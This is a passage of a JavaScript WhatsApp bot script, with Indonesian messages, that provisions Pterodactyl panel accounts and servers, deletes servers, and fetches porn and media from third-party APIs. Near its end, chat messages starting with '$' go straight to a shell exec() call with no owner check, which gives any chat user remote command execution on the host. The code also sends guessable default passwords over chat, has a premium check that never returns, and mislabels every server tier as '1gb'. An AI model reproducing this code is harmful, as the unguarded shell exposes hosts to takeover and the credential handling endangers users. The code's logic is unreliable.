let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name+' - 1gb',
"description": 'Create with '+namabot,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return zyn(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`Sukses menambahkan User dan Server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
}
break

case '5gb': {
if(!isPremium){
reply(mess.only.premium)
}
if (!isOwner) return reply(mess.only.owner)
let t = text.split(','); 
if (t.length < 2) return reply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "5024"
let cpu = "100"
let disk = "5024"
let email = username + "JACK.com"
akunlo = "https://pomf2.lain.la/f/miuqdl.jpg" 
if (!u) return
let d = (await zyn.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+'001'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`User ID: ${user.id}`)
let ctf = `Hai @${m.sender.split('@')[0]}
 Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut ⇩⇩

👤 Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
zyn.sendMessage(u, { image: { url: 'https://g.top4top.io/p_3194iz70l0.jpg' }, caption: ctf }, { quoted: m })
let data2 = await f2.json()
let startup_cmd = data2.attributes.startup
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name+' - 1gb',
"description": 'Create with '+namabot,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return zyn(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`Sukses menambahkan User dan Server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
}
break

case '6gb': {
if(!isPremium){
reply(mess.only.premium)
}
if (!isOwner) return reply(mess.only.owner)
let t = text.split(','); 
if (t.length < 2) return reply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "6024"
let cpu = "160"
let disk = "6024"
let email = username + "JACK.com"
akunlo = "https://pomf2.lain.la/f/miuqdl.jpg" 
if (!u) return
let d = (await zyn.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+'001'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`User ID: ${user.id}`)
let ctf = `Hai @${m.sender.split('@')[0]}
 Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut ⇩⇩

👤 Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
zyn.sendMessage(u, { image: { url: 'https://g.top4top.io/p_3194iz70l0.jpg' }, caption: ctf }, { quoted: m })
let data2 = await f2.json()
let startup_cmd = data2.attributes.startup
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name+' - 1gb',
"description": 'Create with '+namabot,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return zyn(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`Sukses menambahkan User dan Server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
}
break

case '7gb': {
if(!isPremium){
reply(mess.only.premium)
}
if (!isOwner) return reply(mess.only.owner)
let t = text.split(','); 
if (t.length < 2) return reply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "7024"
let cpu = "170"
let disk = "7024"
let email = username + "JACK.com"
akunlo = "https://pomf2.lain.la/f/miuqdl.jpg" 
if (!u) return
let d = (await zyn.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+'001'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`User ID: ${user.id}`)
let ctf = `Hai @${m.sender.split('@')[0]}
 Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut ⇩⇩

👤 Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
zyn.sendMessage(u, { image: { url: 'https://g.top4top.io/p_3194iz70l0.jpg' }, caption: ctf }, { quoted: m })
let data2 = await f2.json()
let startup_cmd = data2.attributes.startup
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name+' - 1gb',
"description": 'Create with '+namabot,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return zyn(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`Sukses menambahkan User dan Server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
}
break

case '8gb': {
if(!isPremium){
reply(mess.only.premium)
}
if (!isOwner) return reply(mess.only.owner)
let t = text.split(','); 
if (t.length < 2) return reply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "8024"
let cpu = "180"
let disk = "8024"
let email = username + "JACK.com"
akunlo = "https://pomf2.lain.la/f/miuqdl.jpg" 
if (!u) return
let d = (await zyn.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+'001'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`User ID: ${user.id}`)
let ctf = `Hai @${m.sender.split('@')[0]}
 Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut ⇩⇩

👤 Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
zyn.sendMessage(u, { image: { url: 'https://g.top4top.io/p_3194iz70l0.jpg' }, caption: ctf }, { quoted: m })
let data2 = await f2.json()
let startup_cmd = data2.attributes.startup
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name+' - 1gb',
"description": 'Create with '+namabot,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return zyn(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`Sukses menambahkan User dan Server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
}
break

case '9gb': {
if(!isPremium){
reply(mess.only.premium)
}
if (!isOwner) return reply(mess.only.owner)
let t = text.split(','); 
if (t.length < 2) return reply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "9024"
let cpu = "190"
let disk = "9024"
let email = username + "JACK.com"
akunlo = "https://pomf2.lain.la/f/miuqdl.jpg" 
if (!u) return
let d = (await zyn.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+'001'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`User ID: ${user.id}`)
let ctf = `Hai @${m.sender.split('@')[0]}
 Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut ⇩⇩

👤 Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
zyn.sendMessage(u, { image: { url: 'https://g.top4top.io/p_3194iz70l0.jpg' }, caption: ctf }, { quoted: m })
let data2 = await f2.json()
let startup_cmd = data2.attributes.startup
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name+' - 1gb',
"description": 'Create with '+namabot,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return zyn(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`Sukses menambahkan User dan Server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
}
break

case 'unli': {
if(!isPremium){
reply(mess.only.premium)
}
if (!isOwner) return reply(mess.only.owner)
let t = text.split(','); 
if (t.length < 2) return reply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "0"
let cpu = "0"
let disk = "0"
let email = username + "JACK.com"
akunlo = "https://pomf2.lain.la/f/miuqdl.jpg" 
if (!u) return
let d = (await zyn.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+'001'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`User ID: ${user.id}`)
let ctf = `Hai @${m.sender.split('@')[0]}
 Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut ⇩⇩

👤 Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
zyn.sendMessage(u, { image: { url: 'https://g.top4top.io/p_3194iz70l0.jpg' }, caption: ctf }, { quoted: m })
let data2 = await f2.json()
let startup_cmd = data2.attributes.startup
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name+' - 1gb',
"description": 'Create with '+namabot,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return zyn(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`Sukses menambahkan User dan Server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
}
break

case "listsrv": {
if (!isOwner) return reply(mess.only.owner)
let page = args[0] ? args[0] : '1';
let f = await fetch(domain + "/api/application/servers?page=" + page, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
});
let res = await f.json();
let servers = res.data;
let sections = [];
let messageText = "Berikut adalah daftar server:\n\n";

for (let server of servers) {
let s = server.attributes;

let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
});

let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;

messageText += `ID Server: ${s.id}\n`;
messageText += `Nama Server: ${s.name}\n`;
messageText += `Status: ${status}\n\n`;
}

messageText += `Halaman: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
messageText += `Total Server: ${res.meta.pagination.count}`;

await zyn.sendMessage(m.chat, { text: messageText }, { quoted: m });

if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
reply(`Gunakan perintah ${prefix ? prefix : '.'}listsrv ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
}
}
break;

case "delsrv": {
if (!isOwner) return reply(mess.only.owner)
let srv = args[0]
if (!srv) return reply('ID nya mana?')
let f = await fetch(domain + "/api/application/servers/" + srv, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('Server tidak ditemukan')
reply('Berhasil minghapus Server.')
}
break
 
case 'totalfitur': {
ngaceng = fs.readFileSync("./ZynTzy.js").toString(),
matches = ngaceng.match(/case '[^']+'(?!.*case '[^']+')/g) || [],
caseCount = matches.length,
caseNames = matches.map(match => match.match(/case '([^']+)'/)[1]);
let block = await zyn.fetchBlocklist()
let gcall = Object.values(await zyn.groupFetchAllParticipating().catch(_=> null))
let totalCases = caseCount,
listCases = caseNames.join('\n${prefix} ');
reply(` *Haii ${pushname}*

𝐓𝐨𝐭𝐚𝐥 𝐅𝐢𝐭𝐮𝐫 : *${totalFitur()} Fitur*`)
}
break

case 'xnxxsearch': {
			if (!text) return m.reply(`Kirim Judul Bokep`)
			try {
				const fg = require('api-dylux')
				let res = await fg.xnxxSearch(text)
				m.reply(mess.wait)
				let ff = res.result.map((v, i) => `${i + 1}┃ *Title* : ${v.title}\n*Link:* ${v.link}\n`).join('\n')
				if (res.status) m.reply(ff)
				
			} catch (error) {
				console.error(error);
				m.reply('Yah Error');
			}
		}
		break
case 'xnxxdl': {
			if (!text) return m.reply(`Kirim Link Bokep di situs XNXX`)
			if (!text.includes('xnxx.com')) return m.reply(`Kirim Link Bokep di situs XNXX`)
			try {
			m.reply(mess.wait)
				const fg = require('api-dylux')
				let xn = await fg.xnxxdl(text)
				let tobatrek = `*XNXX DOWNLOAD*
        
▢ *📌Title*: ${xn.title}
▢ *⌚Duration:* ${xn.duration}
▢ *🎞️Quality:* ${xn.quality}`
await rioo.replyWithVideo({
            url: xn.url_dl,
            },{
            caption: tobatrek,
        })
			} catch (error) {
				console.error(error);
				m.reply('Yah Error');
			}
		}
		break

case "tts":
        {
          if (!text) return m.reply(`[ ! ] ${prefix}${command} halo world`);
          const a = await (
            await axios.post(
              "https://gesserit.co/api/tiktok-tts",
              { text: text, voice: "id_001" },
              {
                headers: {
                  Referer: "https://gesserit.co/tiktok",
                  "User-Agent":
                    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
                  responseType: "arraybuffer",
                },
              },
            )
          ).data;
          const b = Buffer.from(a.audioUrl);
          zyn.sendMessage(m.chat, {
            audio: Buffer.from(a.audioUrl.split("base64,")[1], "base64"),
            mimetype: "audio/mpeg",
          })
        }
        break;

case 'solver': {
	if (!text) return m.reply(`*• Example:* ${prefix + command} Siapakah orang yang telah menemukan Komputer di jaman Majapahit`) 
await zyn.sendMessage(m.chat, { react: { text: "🌚",key: m.key,}}) 
  if (/image/.test(mime)) {
    const media = await sock.downloadAndSaveMediaMessage(quoted)
 	  let anuu = await pomfCDN(media)
    const data = await fetchJson(`https://widipe.com/bardimg?url=${anuu}&text=${encodeURIComponent(text)}`)
    const aimsg = data.result;
    m.reply(`${aimsg}`)
}
}
break

case 'removebg':
  //if (isBan) return m.reply(mess.ban)
  if (!quoted) return m.reply(`*PERMINTAAN ERROR!! PESAN :*\n> *reply/kirim gambar dengan caption .removebg*`)
  if (!/image/.test(mime)) return m.reply(`*PERMINTAAN ERROR!! PESAN :*\n> *Kirim/Reply Gambar Dengan Caption .removebg*`)
  if (/image/.test(mime)) {
m.reply(mess.wait)
  let mee = await m.downloadAndSaveMediaMessage(quoted)
  let mem = await shannzCdn(mee)
  let url = mem.result.url;
  let shannz = await (await fetch(`https://endpoint.web.id/tools/removebg?key=YOUR-KEY&url=${url}`)).json()
  let bg = shannz.result.image
  zyn.sendMessage(m.chat,{image:{url: bg }, caption: '*SUCCESS* ✅'},{quoted: m})
}
break

case 'ttsearch': {
async function tiktoks(query) {
  return new Promise(async (resolve, reject) => {
    try {
      const response = await axios({
        method: 'POST',
        url: 'https://tikwm.com/api/feed/search',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
          'Cookie': 'current_language=en',
          'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36'
        },
        data: {
          keywords: query,
          count: 50,
          cursor: 0,
          HD: 1
        }
      });
      const videos = response.data.data.videos;
      if (videos.length === 0) {
        m.reply("Tidak ada video ditemukan.");
      } else {
        const gywee = Math.floor(Math.random() * videos.length);
        const videorndm = videos[gywee]; 

        const result = {
          title: videorndm.title,
          cover: videorndm.cover,
          origin_cover: videorndm.origin_cover,
          no_watermark: videorndm.play,
          watermark: videorndm.wmplay,
          music: videorndm.music
        };
        m.reply(result);
      }
    } catch (error) {
      m.reply(error);
    }
  });
}
  if (!text) return m.reply(`• Example : .${command} separuh aku`)
  let yoiii = await tiktoks(`${text}`)
  await m.replyWithVideo({
            url: yoiii.no_watermark,
            },{
            caption: '```Result from:```'+' `'+text+`'`+'``Done Ya```'
        })
}
break

case 'play-spotify':
 if (!text) return m.reply('mau cari lagu apa?');
 try {
 let spo = await (await fetch('https://endpoint.web.id/search/spotify?key=YOUR-KEY&query=' + text)).json();
 if (spo.status && spo.result.length > 0) {
 let randomIndex = Math.floor(Math.random() * spo.result.length);
 let track = spo.result[randomIndex];
 let dls = await (await fetch('https://endpoint.web.id/downloader/spotify?key=shz&url=' + track.link)).json();
 let shannz = dls.result;
 
 await zyn.sendMessage(m.chat, { 
 audio: { 
 url: shannz.music
 }, 
 mimetype: 'audio/mp4', contextInfo: {
 externalAdReply: {
 title: shannz.title,
 body: `Author : ${shannz.author}`,
 thumbnailUrl: shannz.thumbnail,
 mediaType: 1,
 showAdAttribution: false,
 renderLargerThumbnail: true,
 },
 }, 
 }, { quoted: m });
 } else {
 m.reply('No results found.');
 }
 } catch (e) {
 m.reply('shannz rest api sedang erorr');
 }
 break

default:
}
if (budy.startsWith('$')) {
exec(budy.slice(2), (err, stdout) => {
if(err) return reply(err)
if (stdout) return reply(stdout)
})
}
if (budy.startsWith(">")) {
if (!isOwner) return reply(mess.only.owner)
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await reply(evaled)
} catch (err) {
reply(String(err))
}
}
} catch (e) {
console.log(e)
zyn.sendMessage(`${owner}@s.whatsapp.net`, {text:`${util.format(e)}`})
}
}

let file = require.resolve(__filename) 
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})